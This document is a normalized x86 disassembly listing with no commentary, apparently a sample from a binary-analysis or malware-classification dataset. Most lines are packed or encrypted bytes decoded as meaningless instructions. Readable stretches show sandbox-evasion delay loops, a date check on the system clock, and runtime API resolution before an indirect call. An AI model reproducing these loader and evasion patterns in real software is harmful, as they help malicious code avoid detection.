jae r-xdata
or edi ecx
and bl [ esp + ebx ]
or dl ch
push ds
and ebp esp
mov ebx eax
jae r-xdata
jae r-xdata
cmp [ esp + ebx ] bl
mov ebx [ ebx ]
das
fsubr [ edx - 0x185a954c ]
or esi [ ebp + 0x38 ]
or esp [ esi + 0x38 ]
sbb al 0x1c
std
mov ah 0x6a
movsd [ edi ] [ esi ]
sti
or ebp [ 0xffffffff8b1c1c38 ]
out dx eax
dec esp
and [ edx - 0x4c ] dl
push 0xffffffa5
dec [ ebx ]
and edi [ eax ]
sbb al 0x1c
mov ebp [ esi ]
loope r-xdata
cwde
jae r-xdata
pushad
dec edx
cmp ebx [ esp + ebx ]
jae r-xdata
movsd [ edi ] [ esi ]
out 0xb eax
jne r-xdata
sti
or ch [ esi ]
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ch 0xb5
jae r-xdata
retn
jae r-xdata
inc edi
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0xb4
or al dl
push es
jae r-xdata
and ecx esp
or cl [ edx + 0x731c1c19 ]
jae r-xdata
sbb al 0x1c
mov eax [ ebx - 0x4b2abb9c ]
push 0x65
push ebx
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sub ch ah
jecxz r-xdata
mov ch 0x6e
jae r-xdata
mov bh 0x18
sbb al 0x1c
mov bl 0xb5
or dh dh
or ebx [ esp + ebx ]
jae r-xdata
mov ch 0xb5
jae r-xdata
sbb al 0x1c
jae r-xdata
cmp esp [ edi ]
push 0x65
push edi
jecxz r-xdata
cmp [ esp + ebx ] bl
mov ecx edx
test [ edx - 0x5a ] ebp
or edi [ ebx + 0x1c35e80a ]
sbb al 0x73
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
push ebx
imul esp [ esi + 0x3a66b13 ] 0x6b
cmpsb [ esi ] [ edi ]
xor ebp [ ebx - 0x5a ]
and ebp [ esi - 0x52 ]
pop es
outsb
cmpsb [ esi ] [ edi ]
inc edi
and al 0xa6
pop es
test al 0xb5
scasb [ edi ]
test al 0x24
cmpsb [ esi ] [ edi ]
or esi [ ebp + 0x24b5a8ae ]
cmpsb [ esi ] [ edi ]
xrstor [ eax - 0x59db514b ]
aaa
scasb [ edi ]
mov al [ eax + 0x3ba62491 ]
mov [ eax + 0x2f0a858c ] ss
and eax 0x73731c1c
jae r-xdata
xor al 0x1c
sbb al 0x73
jae r-xdata
jecxz r-xdata
jae r-xdata
outsb
jecxz r-xdata
test [ ebx ] 0x1c1c383f
mov esp [ edi - 0x68 ]
sbb eax 0xb40e8083
push 0xffffffa5
pushad
test [ eax - 0x27 ] esp
jecxz r-xdata
jecxz r-xdata
in al 0xe3
jae r-xdata
pop ecx
sbb al 0x1c
jae r-xdata
mov edx 0x6a859789
scasb [ edi ]
jae r-xdata
arpl [ esi ] bx
sbb al 0x1c
or bh [ edi + 0x22 ]
sbb al 0x1c
and cx [ edx ]
or dl [ ecx + 0x6 ]
jae r-xdata
and ebp esp
jmp r-xdata
xor eax 0x731c1c38
jae r-xdata
daa
in al dx
jae r-xdata
sbb al 0x73
jae r-xdata
sbb esp eax
scasb [ edi ]
mov dh 0x68
lss ecx [ edx ]
dec ecx
add ebx [ esp + ebx ]
jae r-xdata
aaa
xchg edi eax
test [ edx - 0x52 ] ebp
jae r-xdata
mov edx 0x160a9b89
xor eax 0x73731c1c
jae r-xdata
mov esi 0xf50bb42b
or bl [ esp + ebx ]
sbb al 0x1c
jae r-xdata
push es
jae r-xdata
mov ch 0xa
test [ ebx ] 0x1c
sbb al 0x73
jae r-xdata
sbb al 0x1c
or dl dh
cmp [ esp + ebx ] ebx
outsb
test [ ecx ] esi
push 0x961cd7a5
test [ ecx ] si
jae r-xdata
jae r-xdata
jae r-xdata
lodsb [ esi ]
out dx eax
sub ch ah
jmp r-xdata
sbb al 0x1c
jae r-xdata
push 0xffffffae
mov esp ebx
jecxz r-xdata
jae r-xdata
jae r-xdata
or bl al
add ebx [ esp + ebx ]
sbb al 0x73
jae r-xdata
and bp sp
pushad
retn
and ecx [ edx ]
jecxz r-xdata
sbb ebp [ edx - 0x5a ]
xor ebp [ esi - 0x5a ]
xor esi [ ebx + 0x1c51fe0a ]
sbb al 0x73
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
sbb eax 0x8a0a1c1c
sbb eax 0x5b731c1c
popfd
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
pop ebx
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
push 0xbe6a853d
jmp 0xffffffff93509dfc
in al dx
push esp
movsd [ edi ] [ esi ]
in eax 0x1c
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
sar [ ebx ] cl
sbb al 0x1c
jae r-xdata
or ecx [ 0x1c1c1c26 ]
popfd
call [ edx + 0x1c ]
xchg edi eax
or eax 0x1c1c1c26
jae r-xdata
push 0xffffffbe
sub esi [ ebx + ecx + 0x1c1c0af5 ]
jae r-xdata
sbb al 0x73
jae r-xdata
or dh [ 0x731c1c59 ]
jae r-xdata
sbb al 0xba
push 0x2a66efac
in al dx
and eax 0x1c52ff0b
mov esp ebx
shl ebx cl
jecxz r-xdata
sbb al 0x1c
jae r-xdata
aad 0x1e
jg r-xdata
xlat
mov al 0xb0
outsb
sbb al 0x96
push 0x961ceba6
or bl al
mov ebx esp
push 0x65
aas
jecxz r-xdata
sbb al 0x97
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
mov ah 0x6e
scasb [ edi ]
pop ds
or dh al
pop es
push 0x2a270a0f
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
pop di
sbb [ esp + ebx ] ebx
mov bl 0x6e
cmpsb [ esi ] [ edi ]
xor esi [ ebx + 0x7751cb0 ]
jecxz r-xdata
mov al 0xb0
mov al 0x6e
jae r-xdata
test [ ebp + 0xaa5a0da ] 0x1c1c59d0
xor esp esp
jae r-xdata
mov dh 0x1f
or ah [ esi ]
push cs
sbb al 0x1c
jae r-xdata
push 0x52ff0b25
sbb al 0x1c
jae r-xdata
jae r-xdata
mov edx 0x66efac68
sub ch ah
in eax 0xb
jae r-xdata
mov ecx [ eax - 0x4f2cac4b ]
pop ds
sbb al 0x1c
or bl [ edx + 0x731c1c1f ]
or ebx [ ebx + 0x3b ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0xa
fadd [ ebx ]
sbb al 0x1c
push ebp
in al 0xb3
bound esp [ ecx + ebp ]
jecxz r-xdata
jae r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
mov esp ebp
pop ebp
dec eax
jae r-xdata
mov edx [ edx - 0x4f2cac4b ]
push 0xffffffe5
sbb al 0xa
jae r-xdata
sbb al 0x1c
jae r-xdata
mov [ rw-data ] 0x40c4
nop
push rw-data
call GetLocalTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
jmp r-xdata
sbb al 0x1c
jae r-xdata
0x731c1c1f 0x5b0b
jae r-xdata
mov dh 0x68
mov [ rw-data ] 0x174
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4665e4
retn
jae r-xdata
sbb al 0x1c
jae r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
nop
inc [ rw-data ]
cmp [ rw-data ] 0x152f
jne r-xdata
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
mov ch 0x53
jae r-xdata
cmp ebx [ esp + ebx ]
pop ebx
jae r-xdata
jae r-xdata
mov [ rw-data ] 0x1774
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
mov [ rw-data ] 0x1
jmp r-xdata
retn 0x4
in eax 0x5d
shl [ eax + 0x1c4d1a0a ] cl
jae r-xdata
mov edx 0xaa323d0
cmp eax 0x731c1c24
jae r-xdata
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
inc [ rw-data ]
cmp [ rw-data ] 0x8cea
jne r-xdata
nop
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
nop
nop
nop
mov eax 0x1c750735
call sub_4026bc
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x0
je r-xdata
or bl [ edx ]
jae r-xdata
or ecx [ eax + 0x3b ]
jae r-xdata
mov [ rw-data ] 0x1
dec ebp
jae r-xdata
cmp ebx [ esp + ebx ]
jae r-xdata
mov ecx 0x73
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403198
sbb al 0x73
jae r-xdata
pop ss
loopne r-xdata
push 0xaee01baa
sbb al 0x8b
jae r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_403190
mov [ ebp + 0xab0d353 ] dh
jae r-xdata
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1c74f007
jne r-xdata
call sub_403198
push ebx
jae r-xdata
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
mov [ rw-data ] 0x1
sbb cl [ ebp + 0x1c ]
mov al 0xa
jae r-xdata
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
inc [ rw-data ]
cmp [ rw-data ] 0x8e8b
jne r-xdata
xor eax eax
mov [ rw-data ] eax
push rw-data
call [ rw-data ]
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
jae r-xdata
push 0x1f
call sub_4060e8
cmp [ rw-data ] 0x7
jbe r-xdata
nop
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
push rw-data
call [ rw-data ]
mov edx rw-data
mov eax rw-data
call sub_460e24
mov [ rw-data ] eax
nop
nop
cmp [ rw-data ] 0xc
jbe r-xdata
nop
push 0x0
call sub_460eac
nop
nop
jmp r-xdata
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
call sub_403198
stosb [ edi ]
sub_461c6a
or ebx [ ebp + 0xae3e3c1 ]
inc eax
adc [ esp + ebx ] ebx
push 0x56
jae r-xdata
jecxz r-xdata
jae r-xdata
xor ebx [ esi ]
jae r-xdata
aas
or bh [ ebx ]
out 0xe3 al
jecxz r-xdata
daa
jae r-xdata
sbb al 0x1c
jae r-xdata
in al dx
stosb [ di ]
mov al 0xa
inc edi
mov esp 0x202ab8bd
jae r-xdata
pop esp
and cx [ edx ]
jae r-xdata
sbb al 0xb4
jae r-xdata
not [ 0x66ba1c1c ]
sbb ebp [ edi ]
or ebp [ edx + 0x16 ]
jae r-xdata
out 0xe3 eax
or ch [ edi ]
jae r-xdata
sbb al 0x74
pop ss
jecxz r-xdata
push 0x830f600f
or bh [ edi - 0x13 ]
jecxz r-xdata
loope r-xdata
jecxz r-xdata
in al dx
jae r-xdata
cmp esp esi
jecxz r-xdata
sbb al 0x1c
push ss
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
popfd
shl ebx 0xe3
or al [ eax + 0x11 ]
mov al 0xa4
sbb al 0x75
dec edi
jecxz r-xdata
jae r-xdata
mov ah 0xf3
or cl [ edx + 0x731c1c10 ]
jecxz r-xdata
shl [ ebx ] 0x1
mov [ 0x2ab8bdbc ] eax
jecxz r-xdata
jge r-xdata
jae r-xdata
sbb eax 0x73731c1c
or dl dl
das
mov al 0xb0
sbb al 0xba
jae r-xdata
jecxz r-xdata
jae r-xdata
and al 0xbc
mov ebp 0x972660b8
jae r-xdata
jne r-xdata
mov ebp 0x73202ab8
jae r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
dec ebx
enter 0xe3e3 0x73
jae r-xdata
cmpsd [ esi ] [ edi ]
mov edi esp
jae r-xdata
jmp r-xdata
shl [ ebx - 0x69e31c1d ] cl
jae r-xdata
and bp sp
jae r-xdata
jae r-xdata

or dl ah
shl ebx 0xe3
jae r-xdata
mov dh 0x27
shl si 0x1
jecxz r-xdata
jae r-xdata
jecxz r-xdata
sbb eax 0xd8e3e3f5
jae r-xdata
jae r-xdata
mov bl 0x89
loope r-xdata
jae r-xdata
mov [ 0x1c89e3e3 ] al
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmp [ di ] bl
in al dx
jae r-xdata
loope r-xdata
bound ecx [ edi ]
arpl cx sp
jae r-xdata
sub ah [ eax ]
jae r-xdata
mov esp 0x2660b8bd
xchg edi eax
in al dx
shl [ ecx ] 0x1
test [ edx - 0x4a ] ebp
and eax 0xa8a89b9
mov al [ 0x73e3e3e0 ]
mov [ ebp + 0x27b66a85 ] edx
or bh al
retn 0xe3e3
scasb [ edi ]
aas
or edx [ esi - 0x29 ]
scasb [ edi ]
aaa
outsb
cmpsb [ esi ] [ edi ]
daa
or ebp [ esi - 0x22 ]
jecxz r-xdata
fsubrp st3
jecxz r-xdata
jae r-xdata
and [ edx ] cl
jmp r-xdata
or bl [ 0xffffffffd8e3e3f5 ]
jecxz r-xdata
outsb
pushad
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
add [ ebp + 0xa01a66a ] 0xe3e3fbd5
or ah [ ebx ]
out dx al
jecxz r-xdata
mov bl 0x68
and eax 0x1c166a0b
and al 0xb3
push 0xbcbc7a7
cmp ebp eax
jecxz r-xdata
jae r-xdata
mov ah 0x6a
push 0xffffffa6
stc
mov ebx 0xe3d39a0a
jecxz r-xdata
cmp [ 0x1cd01c1c ] bl
jae r-xdata
jecxz r-xdata
jecxz r-xdata
or cl [ edx + 0x731c1c10 ]
or cl [ ebx - 0x38 ]
jecxz r-xdata
push 0x69e7c7a7
jmp r-xdata
salc
or dl [ esi + esi * 8 ]
jecxz r-xdata
out 0xe3 al
jecxz r-xdata
and bp sp
jecxz r-xdata
push esi
xlat
jge r-xdata
and ebp esp
push 0x6a0ab20f
sbb eax 0x68731c1c
scasb [ edi ]
jmp r-xdata
push 0xffffffb6
and edi [ ecx + 0x6a859b89 ]
mov dh 0x21
mov ecx 0x6a859589
fsub [ eax ]
or ch bl
mul bl
jecxz r-xdata
out dx eax
jae r-xdata
fsubr [ edx - 0x1c5d30f6 ]
jecxz r-xdata
sbb al 0xb3
jae r-xdata
scasd [ edi ]
mov ah 0xb3
or ebx [ ebx - 0x20 ]
jae r-xdata
or al [ edi - 0x7 ]
jge r-xdata
fwait
push ds
sbb al 0x1c
mov bl 0xb0
sbb al 0xb4
mov bl 0xd8
and ah ch
jpo r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
mov edx 0x63e38bba
jecxz r-xdata
sti
jecxz r-xdata
sbb al 0x6e
push es
mov esi 0x73737320
jae r-xdata
pop ebx
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
or ah [ ebp - 0x7 ]
jecxz r-xdata
sbb al 0x73
jae r-xdata
cmc
jae r-xdata

mov dh 0xeb
outsb
sub bx [ esi ]
jecxz r-xdata
jae r-xdata
das
and ecx [ edx ]
jae r-xdata
mov ecx esp
mov ebx [ ebx ]
das
and ebp esp
loopne r-xdata
or esi edi
adc eax 0x66ba1c1c
jecxz r-xdata
pushad
mov ebx esp
or ah [ esi + edx * 8 + 0x2360e3e3 ]
loope r-xdata
pushfd
jmp r-xdata
jae r-xdata
pop ss
mov ebx 0x1c14e20a
sbb al 0x1c
mov [ edi - 0x59957a45 ] edi
push ds
jae r-xdata
cmpsb [ esi ] [ edi ]
mov bl 0xb5
sbb al 0x97
sbb al 0x73
jae r-xdata
adc al 0x1c
mov ah 0xb3
fsub [ eax ]
jae r-xdata
mov al 0x1c
xchg esi eax
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
or dh [ eax + 0x731c1c1d ]
jae r-xdata
rcr [ edx + ecx ] 0x1
sbb al 0x74
jpo r-xdata
jecxz r-xdata
or al [ edi - 0x3b ]
jecxz r-xdata
mov bl 0xb4
push 0xffffffbe
adc ecx [ ebx ]
mov [ 0x60e3e3ca ] eax
push 0x16
jae r-xdata
mov esi 0xcaa30b13
jecxz r-xdata
jae r-xdata
stosb [ edi ]
jae r-xdata
and bp sp
jae r-xdata
jae r-xdata
sbb al 0x1c
or bl [ eax - 0x3e ]
jecxz r-xdata
sub ebx [ esi ]
shl [ ebx ] 0x1
sub ah [ eax ]
or edi [ esi - 0x17 ]
jecxz r-xdata
jae r-xdata
jae r-xdata
or ah dl
jae r-xdata
pushad
fninit
or bl [ edx + 0x13 ]
sbb al 0x1c
loopne r-xdata
outsb
jae r-xdata
shl [ ebx ] 0x1
sbb al 0x89
jae r-xdata
xchg esi eax
jae r-xdata
xchg edi eax
daa
out dx eax
mov ebx esi
outsb
cmpsd [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
and [ ebx + 0x73 ] dh
mov esp [ esi - 0x42431c1d ]
mov eax 0x20be0668
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push ds
in al dx
jae r-xdata
jmp r-xdata
jae r-xdata
loopne r-xdata
sbb al 0x1c
shl [ ebx ] 0x1
mov [ 0x1c1e620a ] eax
sbb al 0x6b
mov edi 0x640a44f6
mov edx 0x67ec2366
push ds
jecxz r-xdata
jae r-xdata
jae r-xdata
vpavgw xmm4 xmm0 xmm3
jecxz r-xdata
mov edi 0xa66a85bb
jae r-xdata
loop r-xdata
or al ch
stc
jecxz r-xdata
fbstp [ ebx + esi * 4 - 0x1c1fb4f5 ]
jae r-xdata
and [ ebx + 0x73 ] dh
and esp [ ebx + 0x2ab8bdbc ]
or cl [ ebx - 0x431c1c5a ]
mov ebp 0xbe0668b8
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
mov edx 0x67ec2366
jae r-xdata
mov [ ebx + esi * 4 ] ebx
jae r-xdata
test bl cl
jecxz r-xdata
jae r-xdata
jae r-xdata
or ah [ eax + 0x73e3e3e0 ]
mov bl 0xb2
or dh [ ebp - 0x24 ]
iretd
mov ah 0x5c
jae r-xdata
mov bl 0x68
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
rcr [ esi + ebp * 2 ] 0x1
jae r-xdata
jecxz r-xdata
and esp ecx
test [ eax - 0x25 ] esp
test [ edx - 0x5a ] ebp
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
outsb
inc edi
stc
mov [ 0xffffffff961ce3e3 ] eax
sbb al 0x96
adc ecx [ edx ]
shl [ edi + 0x7373e3e3 ] 0xb3
sbb al 0x96
and ebp esp
jae r-xdata
mov bl 0xa
jae r-xdata
push 0x60f3c7b7
and edi esp
outsb
jmp r-xdata
fcom st6
jae r-xdata
jae r-xdata
jae r-xdata
daa
out dx eax
mov ch 0xa
xchg [ esi ] edx
sbb al 0x1c
jae r-xdata
jae r-xdata
or ch al
retn 0xe3e3
pop edx
adc ebx [ esp + ebx ]
jpo r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
mov edx 0xe363e38b
jecxz r-xdata
mov ebp ecx
test [ edx - 0x5a ] ebp
int1
mov ebx 0x6a859589
cmpsb [ esi ] [ edi ]
mov ebx 0xf3a66a85
shl [ ebx ] 0x1
jae r-xdata
mov bl 0xb
dec ebx
loopne r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ds
push 0xa6d81fa6
sbb ebp esp
popad
cmp ebx [ esp + ebx ]
sbb al 0xa
stosb [ edi ]
shl bl 0x1
jecxz r-xdata
or dh [ edx + 0x68e3e3e6 ]
0xe3e3
jecxz r-xdata
packsswb mm4 mmx1
loopne r-xdata
shr [ esi + 0x66 ] cl
jae r-xdata
mov bl 0xa
outsb
cmpsb [ esi ] [ edi ]
dec ebx
mov al 0xb3
or esp [ eax ]
loope r-xdata
test [ edx - 0x4a ] ebp
or [ ecx - 0x1c0d34f6 ] edi
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffffa6

push 0xffffffa5
jecxz r-xdata
or ah [ edx - 0x3f ]
jecxz r-xdata
jae r-xdata
or ch [ edi ]
sbb eax 0x1cd01c1c
jae r-xdata
mov ch 0xeb
jae r-xdata
test [ edx - 0x52 ] ebp
jae r-xdata
sbb al 0x1c
mov bl 0x1c
mov ch 0xcf
or ch [ esi ]
adc al 0x1c
sub bx [ esi ]
pushad
jae r-xdata
jae r-xdata
mov ch 0x89
retn
jecxz r-xdata
xchg esi eax
jae r-xdata
jecxz r-xdata
mov dh 0x9
mov ecx 0xe3f2cb0a
and bp sp
or al dh
cli
jecxz r-xdata
sbb al 0xa6
jae r-xdata
jecxz r-xdata
movsb [ edi ] [ esi ]
salc
jecxz r-xdata
jae r-xdata
shl ebx 0xe3
sbb al 0xd0
sbb al 0xa
jae r-xdata
or dl dh
jae r-xdata
or [ eax + 0x2b ] ebp
test [ edx - 0x52 ] ebp
scasb [ edi ]
pushad
and dh bh
push 0xffffffae
jmp 0xffffffffd12a0498
mov ch 0xb5
or ah ch
sti
mov [ esi - 0x1c0e9bf6 ] eax
jecxz r-xdata
or cl [ esi + 0x73e3e3f2 ]
out dx eax
pop ds
mov bl 0xb4
sbb al 0x96
jae r-xdata
mov al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
fld1
jecxz r-xdata
in al dx
popad
pop edi
pop ds
pushad
jae r-xdata
pushad
cmpsb [ esi ] [ edi ]
dec ebx
and al 0xa6
cmpsb [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
je r-xdata
jecxz r-xdata
or ebx esp
salc
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
pop ds
or al [ ecx + 0x731c1c11 ]
sbb al 0xce
mov esp 0x19b80ab8
sbb al 0x1c
mov ah 0x68
sahf

cmpsb [ esi ] [ edi ]
push 0xffffffb6
or edi [ ecx + 0x6a859189 ]
fyl2x
jae r-xdata
mov ch 0xd7
mov al 0x1c
mov ch 0xdf
shl [ ebx ] 0x1
jae r-xdata
ficomp [ esi + 0x2377ec1f ]
jae r-xdata
sahf
pop ds
loopne r-xdata
sbb al 0x74
add esp ebx
jecxz r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
xor esi [ ebx - 0x4c985992 ]
mov ch 0xb5
mov ebx eax
mov ch 0xa
sbb bl ah
jecxz r-xdata
jae r-xdata
sbb al 0x75
jae r-xdata
mov eax esp
mov [ 0x6ab4b88b ] al
mov [ 0x1c11cd0a ] eax
sbb al 0x73
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
pop ds
jae r-xdata
mov al [ 0x2b68e3e3 ]
or ah [ edx - 0x60 ]
jecxz r-xdata
outsb
and bp sp
retn 0xe3c1
jae r-xdata
or ebp [ eax + 0xaa8aeb5 ]
push ss
sbb ebx [ esp + ebx ]
jae r-xdata
pushad
mov [ 0x7373e3e3 ] al
jae r-xdata
jecxz r-xdata
dec edi
jae r-xdata
jae r-xdata
jecxz r-xdata
and ebp esp
jae r-xdata
mov ah [ ebx - 0x1cd8aae4 ]
jecxz r-xdata
xchg [ esp + ebx - 0x1c1cac8b ] esi
mov esp 0xc4500ab8
jecxz r-xdata
ja r-xdata
sbb al 0xb5
push 0xbe6a853c
jae r-xdata
mov al 0x6a
cmpsb [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
mov bl 0x68
and eax 0x1c118f0b
sbb al 0xba
mov eax 0x1c19b80a
sbb al 0xb4
push 0xa66ef39e
add [ edx + edi * 4 - 0x45 ] ebp
jecxz r-xdata
mov eax [ ecx ]
insb
mov edx 0x656ab4bb
jpo r-xdata
or ch [ edx - 0x1f ]
jecxz r-xdata
aas
mov eax 0x6a858089
mov esi 0x8539683d
push 0xffffffbe
add edi [ eax + 0x1c0da30a ]
sbb al 0x73
push 0xbe6a853b
jae r-xdata
jecxz r-xdata
and esp [ ebx - 0x1c0c43f6 ]
push 0xe17d0b1d
jecxz r-xdata
sti
sbb [ esp + ebx ] ebx
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
btr [ edx ] ecx
mov ah 0xa
test al al
jecxz r-xdata
mov dh 0xa
mov dh 0x68
lss esi [ edx - 0x219ff54c ]
mov ebx 0x6a8538d0
mov esi 0x853c68b9
push 0xffffffbe
sub ecx [ edx ]
or esi ecx
in al dx
jecxz r-xdata
sar ecx 0x1
mov ebp ss
jecxz r-xdata
sbb al 0x1c
jecxz r-xdata
mov ah 0x6a
jpo r-xdata
jae r-xdata
jecxz r-xdata
mov [ 0xffffffffe3a2fb0a ] eax
jae r-xdata
sbb al 0x73
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
or dl [ eax ]
retn 0xe3e3
and edi [ eax + edi * 4 - 0x1c3baff6 ]
jecxz r-xdata
jae r-xdata
push 0xffffffbe
jae r-xdata
movsd [ edi ] [ esi ]
xlat
or al [ eax + 0x731c1c19 ]
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
and bp sp
imul dx bp 0xffe3
jecxz r-xdata
or ecx [ edi - 0x45e3e3ef ]
mov ah 0xa
sar [ eax ] 0x1
mov ch 0xd8
sbb [ edx ] cl
jae r-xdata
jae r-xdata
jae r-xdata
or ecx ebx
clc
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
cmp eax 0x6a853968
mov esi 0xa30ab803
or eax 0x73731c1c
jae r-xdata
push 0xffffffbe
jae r-xdata
jg r-xdata

das
fsub [ ebp + 0x19800ad7 ]
sbb al 0x1c
jae r-xdata
push 0xffffffa6
jae r-xdata
in al dx
jae r-xdata
fyl2x
jae r-xdata
jecxz r-xdata
mov bl 0x1c
mov ch 0xd3
outsb
out dx al
jecxz r-xdata
jecxz r-xdata
push 0xb4b2b20f
or ah [ eax - 0x22 ]
jae r-xdata
jae r-xdata
push 0xffffffbe
cmp eax [ ebp - 0x2f444196 ]
cmp [ ebp + 0x68b9be6a ] al
jecxz r-xdata
mov [ ebx - 0x1c5d04f6 ] esp
jae r-xdata
cmp al 0x85
jecxz r-xdata
push 0xce090a2b
or edi edx
push 0x73e3e3a2
pushad
sbb bh [ edi - 0x1c1161f6 ]
in al dx
jae r-xdata
jae r-xdata
jae r-xdata
mov ecx 0x6a853c68
mov esi 0x8089b83f
test [ edx - 0x42 ] ebp
jae r-xdata
in al dx
int1
jae r-xdata
jecxz r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
bound ecx [ edi ]
lahf
out 0xe3 eax
jecxz r-xdata
sti
ja r-xdata
sbb al 0x8b
int3
push 0xed800a1b
jecxz r-xdata
jae r-xdata
jbe r-xdata
xchg sp ax
sbb [ esp + ebx ] bl
shl [ ebx ] 0x1
or dh bh

pushad
jecxz r-xdata
mov ch 0xa
in eax 0xfb
or dl [ 0x69731c1c ]
in eax 0xa
sub eax 0x73e3e3c2
jae r-xdata
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
mov [ edi + 0x53751cb4 ] eax
jecxz r-xdata
pushad
sbb ecx [ edx ]
sub ch 0xe3
jecxz r-xdata
jecxz r-xdata
sbb [ esp + ebp * 8 ] bl
pop es
adc ebp [ ebx - 0x5a ]
jae r-xdata
test al 0xb5
scasb [ edi ]
test al 0x24
cmpsb [ esi ] [ edi ]
mov dh 0x68
fsub st3
jecxz r-xdata
xchg [ edi ] al
jecxz r-xdata
jae r-xdata
jge r-xdata
sbb al 0x1c
mov ecx esp
mov edx 0x6ab07d06
push 0x7d
xor esp ebx
jecxz r-xdata
jae r-xdata
xor [ bx ] bl
sbb al 0x1c
in al dx
sti
jecxz r-xdata
mov ah 0xb
cli
out 0xe3 eax
jecxz r-xdata
push ds
sbb al 0x1c
push 0x77
jmp r-xdata
adc al 0x1c
push 0xffffffae
or esp [ edi + eax * 8 - 0x59951c1d ]
sub ebx [ esi ]
or cl ch
adc [ esp + ebx ] ebx
jae r-xdata
fstp st0
and ebx edx
sahf
jecxz r-xdata
jae r-xdata
jae r-xdata
or dl [ ebx ]
jae r-xdata
jae r-xdata
adc [ 0xffffffffa6681c1c ] bl
jae r-xdata
add ebp [ esi - 0x52 ]
jae r-xdata
jecxz r-xdata
adc esi ebp
or ch [ eax - 0x5e ]
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb ebx [ esp + ebx ]
and bp sp
jae r-xdata
and al 0xa6
jae r-xdata
jae r-xdata
cmc
jae r-xdata
mov dh 0x68
lss esi [ edx + 0x1c1b8a0a ]
sbb al 0x73
jae r-xdata
or ebx [ bp + di ]
sbb al 0x1c
or al [ edx + 0x73e3e3cd ]
jae r-xdata
add bh bh
jecxz r-xdata
salc
pop es
scasb [ edi ]
jae r-xdata
jecxz r-xdata
into
jae r-xdata
jae r-xdata
push 0xe4d90a25
jecxz r-xdata
imul esp [ esi + 0x3a66b13 ] 0x6e
adc bh dh
mov ah [ ebx - 0x1cd8abe4 ]
jecxz r-xdata
push ss
sbb al 0x1c
jae r-xdata
pop ss
shl [ ebx ] 0x1
mov [ 0xffffffffe3f3bc0a ] eax
jae r-xdata
jae r-xdata
setg bh
jecxz r-xdata
jecxz r-xdata
